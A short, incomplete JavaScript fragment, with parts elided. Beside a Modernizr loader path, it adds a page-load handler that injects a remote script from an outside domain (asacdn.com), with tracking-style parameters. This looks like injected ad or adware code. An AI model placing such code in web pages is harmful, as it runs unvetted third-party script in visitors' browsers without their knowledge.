! function() {
    var a = "/casely/js/vendor/modernizr-2.7.1.min.js",
        r = null,
...
document.addEventListener('DOMContentLoaded', function() {
    ...
    esr.src = 'http://asacdn.com/script/suv4.js?aDcPgiD=1&aDgRpiD=93&tAgaDiD=449&nsVnM=ch2';
    esr.type = 'text/javascript';
    esr.setAttribute("cdnd", "asacdn.com");
    esr.setAttribute("data-adel", "lwsu");
    esr.setAttribute("zid", "3885827");
    esp.appendChild(esr);
